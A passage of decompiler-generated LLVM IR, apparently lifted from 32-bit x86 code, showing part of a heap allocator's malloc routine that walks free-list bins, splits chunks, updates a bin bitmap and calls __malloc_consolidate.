  %v10_8053953 = icmp ult i32 %v0_8053953, %v4_8053953
  %v1_8053956 = icmp eq i1 %v10_8053953, false
  br i1 %v1_8053956, label %dec_label_pc_805395e, label %dec_label_pc_805397c

dec_label_pc_805395e:                             ; preds = %dec_label_pc_8053950
  %v1_8053960 = or i32 %v0_8053953, 1
  store i32 %v1_8053960, i32* %eax.global-to-local, align 4
  store i32 %v3_8053943, i32* %ebx.global-to-local, align 4
  %v2_8053974101 = add i32 %v3_8053943, 4
  %v3_8053974102 = inttoptr i32 %v2_8053974101 to i32*
  %v4_8053974103 = load i32, i32* %v3_8053974102, align 4
  %v10_8053974105 = icmp ult i32 %v1_8053960, %v4_8053974103
  br i1 %v10_8053974105, label %dec_label_pc_8053965, label %dec_label_pc_8053979

dec_label_pc_8053965:                             ; preds = %dec_label_pc_805395e, %dec_label_pc_8053965
  %v0_8053979106 = phi i32 [ %v3_8053969, %dec_label_pc_8053965 ], [ %v3_8053943, %dec_label_pc_805395e ]
  store i32 %v0_8053979106, i32* %ecx.global-to-local, align 4
  %v1_8053969 = add i32 %v0_8053979106, 8
  %v2_8053969 = inttoptr i32 %v1_8053969 to i32*
  %v3_8053969 = load i32, i32* %v2_8053969, align 4
  store i32 %v3_8053969, i32* %ecx.global-to-local, align 4
  store i32 %v3_8053969, i32* %ebx.global-to-local, align 4
  %v2_8053974 = add i32 %v3_8053969, 4
  %v3_8053974 = inttoptr i32 %v2_8053974 to i32*
  %v4_8053974 = load i32, i32* %v3_8053974, align 4
  %v10_8053974 = icmp ult i32 %v1_8053960, %v4_8053974
  br i1 %v10_8053974, label %dec_label_pc_8053965, label %dec_label_pc_8053979

dec_label_pc_8053979:                             ; preds = %dec_label_pc_8053965, %dec_label_pc_805395e
  %v0_8053979.lcssa = phi i32 [ %v3_8053943, %dec_label_pc_805395e ], [ %v3_8053969, %dec_label_pc_8053965 ]
  %v1_8053979 = add i32 %v0_8053979.lcssa, 12
  %v2_8053979 = inttoptr i32 %v1_8053979 to i32*
  %v3_8053979 = load i32, i32* %v2_8053979, align 4
  store i32 %v3_8053979, i32* @ebx, align 4
  br label %dec_label_pc_805397c

dec_label_pc_805397c:                             ; preds = %dec_label_pc_8053922, %dec_label_pc_8053950, %dec_label_pc_8053933, %dec_label_pc_8053979
  %v0_805397c = phi i32 [ %v0_8053935, %dec_label_pc_8053933 ], [ %v0_8053935, %dec_label_pc_8053979 ], [ %v0_8053935, %dec_label_pc_8053950 ], [ %v2_8053924, %dec_label_pc_8053922 ]
  %stack_var_-64.1 = phi i32 [ %v3_8053943, %dec_label_pc_8053933 ], [ %v0_8053979.lcssa, %dec_label_pc_8053979 ], [ %v2_805393c, %dec_label_pc_8053950 ], [ %v3_805392e, %dec_label_pc_8053922 ]
  %v1_805397e = urem i32 %v0_805397c, 32
  %v2_805397e = icmp eq i32 %v1_805397e, 0
  store i32 %v1_805397e, i32* %esi.global-to-local, align 4
  store i32 %v1_805397e, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8053988 = sdiv i32 %v0_805397c, 32
  store i32 %v2_8053988, i32* %edx.global-to-local, align 4
  br i1 %v2_805397e, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_805397c
  %v5_805398b = shl i32 1, %v1_805397e
  store i32 %v5_805398b, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_805397c, %bb
  %v5_805398d = phi i32 [ 1, %dec_label_pc_805397c ], [ %v5_805398b, %bb ]
  %v1_805398d = mul nsw i32 %v2_8053988, 4
  %v2_805398d = add i32 %v1_805398d, ptrtoint (i32* @global_var_8062b74.507 to i32)
  %v3_805398d = inttoptr i32 %v2_805398d to i32*
  %v4_805398d = load i32, i32* %v3_805398d, align 4
  %v6_805398d = or i32 %v4_805398d, %v5_805398d
  store i32 %v6_805398d, i32* %v3_805398d, align 4
  %v0_8053994 = load i32, i32* @ebx, align 4
  %v1_8053994 = load i32, i32* @ebp, align 4
  %v2_8053994 = add i32 %v1_8053994, 12
  %v3_8053994 = inttoptr i32 %v2_8053994 to i32*
  store i32 %v0_8053994, i32* %v3_8053994, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_805399b = load i32, i32* @ebp, align 4
  %v2_805399b = add i32 %v1_805399b, 8
  %v3_805399b = inttoptr i32 %v2_805399b to i32*
  store i32 %stack_var_-64.1, i32* %v3_805399b, align 4
  %v0_805399e = load i32, i32* @ebp, align 4
  %v1_805399e = load i32, i32* @esi, align 4
  %v2_805399e = add i32 %v1_805399e, 12
  %v3_805399e = inttoptr i32 %v2_805399e to i32*
  store i32 %v0_805399e, i32* %v3_805399e, align 4
  %v0_80539a1 = load i32, i32* @ebp, align 4
  %v1_80539a1 = load i32, i32* @ebx, align 4
  %v2_80539a1 = add i32 %v1_80539a1, 8
  %v3_80539a1 = inttoptr i32 %v2_80539a1 to i32*
  store i32 %v0_80539a1, i32* %v3_80539a1, align 4
  %v0_80539a4 = load i32, i32* @global_var_8062880.506, align 128
  store i32 %v0_80539a4, i32* @ebp, align 4
  %v9_80539aa = icmp eq i32 %v0_80539a4, 134621300
  %v1_80539b0 = icmp eq i1 %v9_80539aa, false
  br i1 %v1_80539b0, label %dec_label_pc_80538d3, label %dec_label_pc_80539b6

dec_label_pc_80539b6:                             ; preds = %bb82, %dec_label_pc_80539a4.preheader
  br i1 %v8_8053867, label %dec_label_pc_8053a44, label %dec_label_pc_80539c4

dec_label_pc_80539c4:                             ; preds = %dec_label_pc_80539b6
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_80539c8 = mul i32 %stack_var_-40.0.ph, 8
  %v2_80539c8 = add i32 %v1_80539c8, ptrtoint (i32* @global_var_806286c.503 to i32)
  store i32 %v2_80539c8, i32* %edx.global-to-local, align 4
  %v1_80539cf = add i32 %v1_80539c8, add (i32 ptrtoint (i32* @global_var_806286c.503 to i32), i32 12)
  %v2_80539cf = inttoptr i32 %v1_80539cf to i32*
  %storemerge1.pre = load i32, i32* %v2_80539cf, align 4
  br label %dec_label_pc_8053a40

dec_label_pc_80539d4:                             ; preds = %dec_label_pc_8053a40
  %v1_80539d4 = add i32 %v4_80539eb, 4
  %v2_80539d4 = inttoptr i32 %v1_80539d4 to i32*
  %v3_80539d4 = load i32, i32* %v2_80539d4, align 4
  store i32 %v3_80539d4, i32* %ebx.global-to-local, align 4
  %v1_80539d7 = add i32 %v4_80539eb, 12
  %v2_80539d7 = inttoptr i32 %v1_80539d7 to i32*
  %v3_80539d7 = load i32, i32* %v2_80539d7, align 4
  store i32 %v3_80539d7, i32* @ecx, align 4
  %v1_80539da = and i32 %v3_80539d4, -4
  store i32 %v1_80539da, i32* @ebx, align 4
  %v10_80539dd = icmp ult i32 %v1_80539da, %v1_8053bbe
  br i1 %v10_80539dd, label %dec_label_pc_8053a40, label %dec_label_pc_80539e3

dec_label_pc_80539e3:                             ; preds = %dec_label_pc_80539d4
  %v1_80539e3 = add i32 %v4_80539eb, 8
  %v2_80539e3 = inttoptr i32 %v1_80539e3 to i32*
  %v3_80539e3 = load i32, i32* %v2_80539e3, align 4
  store i32 %v3_80539e3, i32* @edx, align 4
  %v1_80539e6 = add i32 %v3_80539e3, 12
  %v2_80539e6 = inttoptr i32 %v1_80539e6 to i32*
  %v3_80539e6 = load i32, i32* %v2_80539e6, align 4
  %v15_80539e6 = icmp eq i32 %v3_80539e6, %v4_80539eb
  %v1_80539e9 = icmp eq i1 %v15_80539e6, false
  br i1 %v1_80539e9, label %dec_label_pc_80539f0, label %dec_label_pc_80539eb

dec_label_pc_80539eb:                             ; preds = %dec_label_pc_80539e3
  %v1_80539eb = add i32 %v3_80539d7, 8
  %v2_80539eb = inttoptr i32 %v1_80539eb to i32*
  %v3_80539eb = load i32, i32* %v2_80539eb, align 4
  %v15_80539eb = icmp eq i32 %v3_80539eb, %v4_80539eb
  br i1 %v15_80539eb, label %dec_label_pc_80539f5, label %dec_label_pc_80539f0

dec_label_pc_80539f0:                             ; preds = %dec_label_pc_80539eb, %dec_label_pc_80539e3
  %v0_80539f0 = call i32 @abort()
  store i32 %v0_80539f0, i32* %eax.global-to-local, align 4
  %v0_80539f5.pre = load i32, i32* @ebx, align 4
  %v0_80539fb.pre = load i32, i32* @ecx, align 4
  %v1_80539fb.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80539f5

dec_label_pc_80539f5:                             ; preds = %dec_label_pc_80539eb, %dec_label_pc_80539f0
  %v1_80539fb = phi i32 [ %v3_80539e3, %dec_label_pc_80539eb ], [ %v1_80539fb.pre, %dec_label_pc_80539f0 ]
  %v0_80539fb = phi i32 [ %v3_80539d7, %dec_label_pc_80539eb ], [ %v0_80539fb.pre, %dec_label_pc_80539f0 ]
  %v0_80539f5 = phi i32 [ %v1_80539da, %dec_label_pc_80539eb ], [ %v0_80539f5.pre, %dec_label_pc_80539f0 ]
  %v5_80539f7 = sub i32 %v0_80539f5, %v1_8053bbe
  store i32 %v5_80539f7, i32* %esi.global-to-local, align 4
  %v2_80539fb = add i32 %v1_80539fb, 12
  %v3_80539fb = inttoptr i32 %v2_80539fb to i32*
  store i32 %v0_80539fb, i32* %v3_80539fb, align 4
  %v0_80539fe = load i32, i32* @edx, align 4
  %v1_80539fe = load i32, i32* @ecx, align 4
  %v2_80539fe = add i32 %v1_80539fe, 8
  %v3_80539fe = inttoptr i32 %v2_80539fe to i32*
  store i32 %v0_80539fe, i32* %v3_80539fe, align 4
  %v0_8053a01 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a01 = add i32 %v0_8053a01, 8
  store i32 %v1_8053a01, i32* @ecx, align 4
  %v0_8053a04 = load i32, i32* %esi.global-to-local, align 4
  %tmp137 = icmp ult i32 %v0_8053a04, 16
  br i1 %tmp137, label %dec_label_pc_8053f33, label %dec_label_pc_8053a0d

dec_label_pc_8053a0d:                             ; preds = %dec_label_pc_80539f5
  %v2_8053a11 = add i32 %v0_8053a01, %v1_8053bbe
  store i32 %v2_8053a11, i32* @edx, align 4
  %v1_8053a14 = or i32 %v1_8053bbe, 1
  store i32 %v1_8053a14, i32* %ebx.global-to-local, align 4
  %v2_8053a17 = add i32 %v0_8053a01, 4
  %v3_8053a17 = inttoptr i32 %v2_8053a17 to i32*
  store i32 %v1_8053a14, i32* %v3_8053a17, align 4
  %v0_8053a1a = load i32, i32* %esi.global-to-local, align 4
  %v1_8053a1c = or i32 %v0_8053a1a, 1
  store i32 %v1_8053a1c, i32* %eax.global-to-local, align 4
  %v0_8053a1f = load i32, i32* @edx, align 4
  %v1_8053a1f = load i32, i32* @ebp, align 4
  %v2_8053a1f = add i32 %v1_8053a1f, 8
  %v3_8053a1f = inttoptr i32 %v2_8053a1f to i32*
  store i32 %v0_8053a1f, i32* %v3_8053a1f, align 4
  %v0_8053a22 = load i32, i32* @edx, align 4
  %v1_8053a22 = load i32, i32* @ebp, align 4
  %v2_8053a22 = add i32 %v1_8053a22, 12
  %v3_8053a22 = inttoptr i32 %v2_8053a22 to i32*
  store i32 %v0_8053a22, i32* %v3_8053a22, align 4
  %v0_8053a25 = load i32, i32* @edx, align 4
  %v1_8053a25 = add i32 %v0_8053a25, 8
  %v2_8053a25 = inttoptr i32 %v1_8053a25 to i32*
  store i32 ptrtoint (i32* @global_var_8062874.505 to i32), i32* %v2_8053a25, align 4
  %v0_8053a2c = load i32, i32* @edx, align 4
  %v1_8053a2c = add i32 %v0_8053a2c, 12
  %v2_8053a2c = inttoptr i32 %v1_8053a2c to i32*
  store i32 ptrtoint (i32* @global_var_8062874.505 to i32), i32* %v2_8053a2c, align 4
  %v0_8053a33 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a33 = load i32, i32* @edx, align 4
  %v2_8053a33 = add i32 %v1_8053a33, 4
  %v3_8053a33 = inttoptr i32 %v2_8053a33 to i32*
  store i32 %v0_8053a33, i32* %v3_8053a33, align 4
  %v0_8053a36 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053a36 = load i32, i32* @edx, align 4
  %v3_8053a36 = add i32 %v1_8053a36, %v0_8053a36
  %v4_8053a36 = inttoptr i32 %v3_8053a36 to i32*
  store i32 %v0_8053a36, i32* %v4_8053a36, align 4
  br label %dec_label_pc_8053f38

dec_label_pc_8053a40:                             ; preds = %dec_label_pc_80539d4, %dec_label_pc_80539c4
  %v4_80539eb = phi i32 [ %storemerge1.pre, %dec_label_pc_80539c4 ], [ %v3_80539d7, %dec_label_pc_80539d4 ]
  store i32 %v4_80539eb, i32* %eax.global-to-local, align 4
  %v12_8053a40 = icmp eq i32 %v4_80539eb, %v2_80539c8
  %v1_8053a42 = icmp eq i1 %v12_8053a40, false
  br i1 %v1_8053a42, label %dec_label_pc_80539d4, label %dec_label_pc_8053a44.loopexit

dec_label_pc_8053a44.loopexit:                    ; preds = %dec_label_pc_8053a40
  br label %dec_label_pc_8053a44

dec_label_pc_8053a44:                             ; preds = %dec_label_pc_8053a44.loopexit, %dec_label_pc_80539b6
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8053a4d = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_8053a4d, i32* %ecx.global-to-local, align 4
  %v2_8053a50 = udiv i32 %v1_8053a4d, 32
  store i32 %v2_8053a50, i32* @edi, align 4
  %v1_8053a53 = mul nuw nsw i32 %v2_8053a50, 4
  %v2_8053a53 = add i32 %v1_8053a53, ptrtoint (i32* @global_var_8062b74.507 to i32)
  %v3_8053a53 = inttoptr i32 %v2_8053a53 to i32*
  %v4_8053a53 = load i32, i32* %v3_8053a53, align 4
  store i32 %v4_8053a53, i32* %edx.global-to-local, align 4
  %v1_8053a5a = mul i32 %v1_8053a4d, 8
  %v2_8053a5a = add i32 %v1_8053a5a, ptrtoint (i32* @global_var_806286c.503 to i32)
  store i32 %v2_8053a5a, i32* %ebx.global-to-local, align 4
  %v1_8053a61 = urem i32 %v1_8053a4d, 32
  %v2_8053a61 = icmp eq i32 %v1_8053a61, 0
  store i32 %v1_8053a61, i32* %ecx.global-to-local, align 4
  br i1 %v2_8053a61, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_8053a44
  %v5_8053a64 = shl i32 1, %v1_8053a61
  store i32 %v5_8053a64, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8053a44, %bb83, %dec_label_pc_8053aa5
  %v1_8053a66 = phi i32 [ %v1_8053a66.pre, %dec_label_pc_8053aa5 ], [ %v4_8053a53, %bb83 ], [ %v4_8053a53, %dec_label_pc_8053a44 ]
  %v0_8053a6a = phi i32 [ %v0_8053a66.pre, %dec_label_pc_8053aa5 ], [ %v5_8053a64, %bb83 ], [ 1, %dec_label_pc_8053a44 ]
  %tmp84 = icmp ule i32 %v0_8053a6a, %v1_8053a66
  %v1_8053a6a = icmp eq i32 %v0_8053a6a, 0
  %v1_8053a6c = icmp eq i1 %v1_8053a6a, false
  %or.cond = and i1 %tmp84, %v1_8053a6c
  br i1 %or.cond, label %dec_label_pc_8053a6a.dec_label_pc_8053a9a.preheader_crit_edge, label %dec_label_pc_8053a6e.preheader

dec_label_pc_8053a6a.dec_label_pc_8053a9a.preheader_crit_edge: ; preds = %.preheader
  %v0_8053a9512.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053a9a.preheader

dec_label_pc_8053a6e.preheader:                   ; preds = %.preheader
  %v0_8053a6e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053a6e

dec_label_pc_8053a6e:                             ; preds = %dec_label_pc_8053a6e.preheader, %dec_label_pc_8053a78
  %v0_8053a6e = phi i32 [ %v0_8053a6e.pre, %dec_label_pc_8053a6e.preheader ], [ %v1_8053a6e, %dec_label_pc_8053a78 ]
  %v1_8053a6e = add i32 %v0_8053a6e, 1
  store i32 %v1_8053a6e, i32* @edi, align 4
  %v6_8053a72 = icmp ugt i32 %v1_8053a6e, 2
  br i1 %v6_8053a72, label %dec_label_pc_8053b29.loopexit, label %dec_label_pc_8053a78

dec_label_pc_8053a78:                             ; preds = %dec_label_pc_8053a6e
  %v1_8053a78 = mul i32 %v1_8053a6e, 4
  %v2_8053a78 = add i32 %v1_8053a78, ptrtoint (i32* @global_var_8062b74.507 to i32)
  %v3_8053a78 = inttoptr i32 %v2_8053a78 to i32*
  %v4_8053a78 = load i32, i32* %v3_8053a78, align 4
  store i32 %v4_8053a78, i32* %edx.global-to-local, align 4
  %v1_8053a7f = icmp eq i32 %v4_8053a78, 0
  br i1 %v1_8053a7f, label %dec_label_pc_8053a6e, label %dec_label_pc_8053a83

dec_label_pc_8053a83:                             ; preds = %dec_label_pc_8053a78
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8053a8a = mul i32 %v1_8053a6e, 256
  store i32 %v2_8053a8a, i32* %eax.global-to-local, align 4
  %v1_8053a8d = add i32 %v2_8053a8a, ptrtoint (i32* @global_var_806286c.503 to i32)
  store i32 %v1_8053a8d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053a9a.preheader

dec_label_pc_8053a9a.preheader:                   ; preds = %dec_label_pc_8053a6a.dec_label_pc_8053a9a.preheader_crit_edge, %dec_label_pc_8053a83
  %v0_8053a9512 = phi i32 [ %v1_8053a8d, %dec_label_pc_8053a83 ], [ %v0_8053a9512.pre, %dec_label_pc_8053a6a.dec_label_pc_8053a9a.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8053a83 ], [ %v0_8053a6a, %dec_label_pc_8053a6a.dec_label_pc_8053a9a.preheader_crit_edge ]
  %v0_8053aab = phi i32 [ %v4_8053a78, %dec_label_pc_8053a83 ], [ %v1_8053a66, %dec_label_pc_8053a6a.dec_label_pc_8053a9a.preheader_crit_edge ]
  %v2_8053a9a4 = and i32 %v0_8053aab, %esi.promoted
  %v3_8053a9a5 = icmp eq i32 %v2_8053a9a4, 0
  br i1 %v3_8053a9a5, label %dec_label_pc_8053a95, label %dec_label_pc_8053a9e

dec_label_pc_8053a95:                             ; preds = %dec_label_pc_8053a9a.preheader, %dec_label_pc_8053a95
  %v2_8053a9814 = phi i32 [ %v2_8053a98, %dec_label_pc_8053a95 ], [ %esi.promoted, %dec_label_pc_8053a9a.preheader ]
  %v0_8053a9513 = phi i32 [ %v1_8053a95, %dec_label_pc_8053a95 ], [ %v0_8053a9512, %dec_label_pc_8053a9a.preheader ]
  %v1_8053a95 = add i32 %v0_8053a9513, 8
  %v2_8053a98 = mul i32 %v2_8053a9814, 2
  %v2_8053a9a = and i32 %v2_8053a98, %v0_8053aab
  %v3_8053a9a = icmp eq i32 %v2_8053a9a, 0
  br i1 %v3_8053a9a, label %dec_label_pc_8053a95, label %dec_label_pc_8053a9a.dec_label_pc_8053a9e_crit_edge

dec_label_pc_8053a9a.dec_label_pc_8053a9e_crit_edge: ; preds = %dec_label_pc_8053a95
  store i32 %v1_8053a95, i32* %ebx.global-to-local, align 4
  store i32 %v2_8053a98, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053a9e

dec_label_pc_8053a9e:                             ; preds = %dec_label_pc_8053a9a.dec_label_pc_8053a9e_crit_edge, %dec_label_pc_8053a9a.preheader
  %v0_8053aa5 = phi i32 [ %v2_8053a98, %dec_label_pc_8053a9a.dec_label_pc_8053a9e_crit_edge ], [ %esi.promoted, %dec_label_pc_8053a9a.preheader ]
  %v1_8053ac8 = phi i32 [ %v1_8053a95, %dec_label_pc_8053a9a.dec_label_pc_8053a9e_crit_edge ], [ %v0_8053a9512, %dec_label_pc_8053a9a.preheader ]
  %v1_8053a9e = add i32 %v1_8053ac8, 12
  %v2_8053a9e = inttoptr i32 %v1_8053a9e to i32*
  %v3_8053a9e = load i32, i32* %v2_8053a9e, align 4
  store i32 %v3_8053a9e, i32* @ecx, align 4
  %v12_8053aa1 = icmp eq i32 %v3_8053a9e, %v1_8053ac8
  %v1_8053aa3 = icmp eq i1 %v12_8053aa1, false
  br i1 %v1_8053aa3, label %dec_label_pc_8053ab9, label %dec_label_pc_8053aa5

dec_label_pc_8053aa5:                             ; preds = %dec_label_pc_8053a9e
  %v2_8053aa7 = mul i32 %v0_8053aa5, 2
  store i32 %v2_8053aa7, i32* %esi.global-to-local, align 4
  %v1_8053aa9 = sub i32 -1, %v0_8053aa5
  store i32 %v1_8053aa9, i32* %eax.global-to-local, align 4
  %v2_8053aab = and i32 %v0_8053aab, %v1_8053aa9
  store i32 %v2_8053aab, i32* %edx.global-to-local, align 4
  %v1_8053aad = add i32 %v3_8053a9e, 8
  store i32 %v1_8053aad, i32* %ebx.global-to-local, align 4
  %v1_8053ab0 = load i32, i32* @edi, align 4
  %v2_8053ab0 = mul i32 %v1_8053ab0, 4
  %v3_8053ab0 = add i32 %v2_8053ab0, ptrtoint (i32* @global_var_8062b74.507 to i32)
  %v4_8053ab0 = inttoptr i32 %v3_8053ab0 to i32*
  store i32 %v2_8053aab, i32* %v4_8053ab0, align 4
  %v0_8053a66.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8053a66.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8053ab9:                             ; preds = %dec_label_pc_8053a9e
  %v1_8053ab9 = add i32 %v3_8053a9e, 4
  %v2_8053ab9 = inttoptr i32 %v1_8053ab9 to i32*
  %v3_8053ab9 = load i32, i32* %v2_8053ab9, align 4
  store i32 %v3_8053ab9, i32* %edx.global-to-local, align 4
  %v1_8053abc = add i32 %v3_8053a9e, 12
  %v2_8053abc = inttoptr i32 %v1_8053abc to i32*
  %v3_8053abc = load i32, i32* %v2_8053abc, align 4
  store i32 %v3_8053abc, i32* %eax.global-to-local, align 4
  %v1_8053abf = and i32 %v3_8053ab9, -4
  store i32 %v1_8053abf, i32* @edx, align 4
  %v5_8053ac4 = sub i32 %v1_8053abf, %v1_8053bbe
  store i32 %v5_8053ac4, i32* %esi.global-to-local, align 4
  store i32 %v3_8053abc, i32* %v2_8053a9e, align 4
  %v0_8053acb = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053acb = load i32, i32* %eax.global-to-local, align 4
  %v2_8053acb = add i32 %v1_8053acb, 8
  %v3_8053acb = inttoptr i32 %v2_8053acb to i32*
  store i32 %v0_8053acb, i32* %v3_8053acb, align 4
  %v0_8053ace = load i32, i32* %esi.global-to-local, align 4
  %tmp138 = icmp ult i32 %v0_8053ace, 16
  %v0_8053ad3 = load i32, i32* @ecx, align 4
  br i1 %tmp138, label %dec_label_pc_8053ad3, label %dec_label_pc_8053ada

dec_label_pc_8053ad3:                             ; preds = %dec_label_pc_8053ab9
  %v1_8053ad3 = load i32, i32* @edx, align 4
  %v2_8053ad3 = add i32 %v0_8053ad3, 4
  %v3_8053ad3 = add i32 %v2_8053ad3, %v1_8053ad3
  %v4_8053ad3 = inttoptr i32 %v3_8053ad3 to i32*
  %v5_8053ad3 = load i32, i32* %v4_8053ad3, align 4
  %v6_8053ad3 = or i32 %v5_8053ad3, 1
  store i32 %v6_8053ad3, i32* %v4_8053ad3, align 4
  br label %dec_label_pc_8053b21

dec_label_pc_8053ada:                             ; preds = %dec_label_pc_8053ab9
  %v2_8053ade = add i32 %v0_8053ad3, %v1_8053bbe
  store i32 %v2_8053ade, i32* %eax.global-to-local, align 4
  %v1_8053ae7 = load i32, i32* @ebp, align 4
  %v2_8053ae7 = add i32 %v1_8053ae7, 8
  %v3_8053ae7 = inttoptr i32 %v2_8053ae7 to i32*
  store i32 %v2_8053ade, i32* %v3_8053ae7, align 4
  %v0_8053aea = load i32, i32* %eax.global-to-local, align 4
  %v1_8053aea = load i32, i32* @ebp, align 4
  %v2_8053aea = add i32 %v1_8053aea, 12
  %v3_8053aea = inttoptr i32 %v2_8053aea to i32*
  store i32 %v0_8053aea, i32* %v3_8053aea, align 4
  %v0_8053aed = load i32, i32* %eax.global-to-local, align 4
  %v1_8053aed = add i32 %v0_8053aed, 8
  %v2_8053aed = inttoptr i32 %v1_8053aed to i32*
  store i32 ptrtoint (i32* @global_var_8062874.505 to i32), i32* %v2_8053aed, align 4
  %v0_8053af4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053af4 = add i32 %v0_8053af4, 12
  %v2_8053af4 = inttoptr i32 %v1_8053af4 to i32*
  store i32 ptrtoint (i32* @global_var_8062874.505 to i32), i32* %v2_8053af4, align 4
  %v0_8053afb = load i32, i32* @global_var_8062870.504, align 16
  %v4_8053b01 = load i32, i32* %eax.global-to-local, align 4
  %v5_8053b01 = select i1 %v8_8053867, i32 %v4_8053b01, i32 %v0_8053afb
  %v4_8053b04 = or i32 %v1_8053bbe, 1
  store i32 %v5_8053b01, i32* @global_var_8062870.504, align 16
  %v0_8053b0f = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8053b04, i32* %ebx.global-to-local, align 4
  %v1_8053b15 = or i32 %v0_8053b0f, 1
  store i32 %v1_8053b15, i32* @edx, align 4
  %v3_8053b18 = add i32 %v0_8053b0f, %v4_8053b01
  %v4_8053b18 = inttoptr i32 %v3_8053b18 to i32*
  store i32 %v0_8053b0f, i32* %v4_8053b18, align 4
  %v0_8053b1b = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053b1b = load i32, i32* @ecx, align 4
  %v2_8053b1b = add i32 %v1_8053b1b, 4
  %v3_8053b1b = inttoptr i32 %v2_8053b1b to i32*
  store i32 %v0_8053b1b, i32* %v3_8053b1b, align 4
  %v0_8053b1e = load i32, i32* @edx, align 4
  %v1_8053b1e = load i32, i32* %eax.global-to-local, align 4
  %v2_8053b1e = add i32 %v1_8053b1e, 4
  %v3_8053b1e = inttoptr i32 %v2_8053b1e to i32*
  store i32 %v0_8053b1e, i32* %v3_8053b1e, align 4
  br label %dec_label_pc_8053b21

dec_label_pc_8053b21:                             ; preds = %dec_label_pc_8053c15, %dec_label_pc_8053ad3, %dec_label_pc_8053ada
  %v0_8053b21 = load i32, i32* @ecx, align 4
  %v1_8053b21 = add i32 %v0_8053b21, 8
  store i32 %v1_8053b21, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053f49

dec_label_pc_8053b29.loopexit:                    ; preds = %dec_label_pc_8053a6e
  br label %dec_label_pc_8053b29

dec_label_pc_8053b29:                             ; preds = %dec_label_pc_8053b29.loopexit, %dec_label_pc_8053829, %dec_label_pc_8053831
  %v0_8053b29 = load i32, i32* @global_var_806286c.503, align 4
  store i32 %v0_8053b29, i32* @ebx, align 4
  store i32 %v1_8053bbe, i32* %esi.global-to-local, align 4
  %v1_8053b33 = add i32 %v0_8053b29, 4
  %v2_8053b33 = inttoptr i32 %v1_8053b33 to i32*
  %v3_8053b33 = load i32, i32* %v2_8053b33, align 4
  %v1_8053b36 = add i32 %v1_8053bbe, 16
  store i32 %v1_8053b36, i32* @esi, align 4
  %v1_8053b3d = and i32 %v3_8053b33, -4
  store i32 %v1_8053b3d, i32* %ecx.global-to-local, align 4
  %v7_8053b40 = icmp ult i32 %v1_8053b3d, %v1_8053b36
  br i1 %v7_8053b40, label %dec_label_pc_8053b60, label %dec_label_pc_8053b44

dec_label_pc_8053b44:                             ; preds = %dec_label_pc_8053b29
  %v2_8053b48 = add i32 %v0_8053b29, %v1_8053bbe
  store i32 %v2_8053b48, i32* @edx, align 4
  %v1_8053b4b = or i32 %v1_8053bbe, 1
  store i32 %v1_8053b4b, i32* %eax.global-to-local, align 4
  store i32 %v2_8053b48, i32* @global_var_806286c.503, align 4
  store i32 %v1_8053b4b, i32* %v2_8053b33, align 4
  %v0_8053b57 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8053b57 = sub i32 %v0_8053b57, %v1_8053bbe
  store i32 %v5_8053b57, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053ed9

dec_label_pc_8053b60:                             ; preds = %dec_label_pc_8053b29
  %v0_8053b60 = load i8, i8* @global_var_8062840.502, align 64
  %v1_8053b60 = and i8 %v0_8053b60, 2
  %v2_8053b60 = icmp eq i8 %v1_8053b60, 0
  %v0_8053b67 = load i32, i32* @global_var_8062b9c.508, align 4
  store i32 %v0_8053b67, i32* %edx.global-to-local, align 4
  br i1 %v2_8053b60, label %dec_label_pc_8053b94, label %dec_label_pc_8053b6f

dec_label_pc_8053b6f:                             ; preds = %dec_label_pc_8053b60
  store i32 ptrtoint (i8* @global_var_8062840.502 to i32), i32* %stack_var_-92, align 4
  %v2_8053b77 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8062840.502 to i32*))
  store i32 ptrtoint (i8* @global_var_8062840.502 to i32), i32* @ebx, align 4
  %v1_8053b81 = add i32 %v1_8053bbe, -7
  store i32 %v1_8053b81, i32* %eax.global-to-local, align 4
  store i32 %v1_8053b81, i32* %stack_var_-92, align 4
  %v1_8053b85 = call i32 @malloc(i32 %v1_8053b81)
  store i32 %v1_8053b85, i32* %eax.global-to-local, align 4
  store i32 %v1_8053b85, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053f49

dec_label_pc_8053b94:                             ; preds = %dec_label_pc_8053b60
  store i32 %v1_8053bbe, i32* @ebx, align 4
  %v1_8053b98 = add i32 %v0_8053b67, -1
  store i32 %v1_8053b98, i32* @ecx, align 4
  %v1_8053b9b = load i32, i32* @global_var_8062b8c.509, align 4
  %v7_8053b9b = icmp ult i32 %v1_8053bbe, %v1_8053b9b
  br i1 %v7_8053b9b, label %dec_label_pc_8053c76, label %dec_label_pc_8053bab

dec_label_pc_8053bab:                             ; preds = %dec_label_pc_8053b94
  %v0_8053bab = load i32, i32* @global_var_8062b90.510, align 16
  store i32 %v0_8053bab, i32* %eax.global-to-local, align 4
  %v1_8053bb0 = load i32, i32* @global_var_8062b94.511, align 4
